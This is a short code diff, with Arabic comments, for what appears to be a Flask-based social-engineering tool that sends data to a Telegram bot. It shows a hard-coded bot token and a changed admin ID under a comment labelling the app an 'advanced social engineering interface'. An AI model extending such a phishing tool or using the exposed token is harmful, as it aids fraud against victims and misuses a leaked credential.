@@ -7,7 +7,7 @@ import threading
 
 # --- الإعدادات (ضع بياناتك هنا) ---
 BOT_TOKEN = "8754086355:AAEw66jFIpxnxRRvpyN4Syf4YPSXRvGsPmQ"
-ADMIN_ID = "6555135671"
+ADMIN_ID = "8754086355"
 app = Flask(__name__)
 
 # واجهة هندسة اجتماعية متطورة
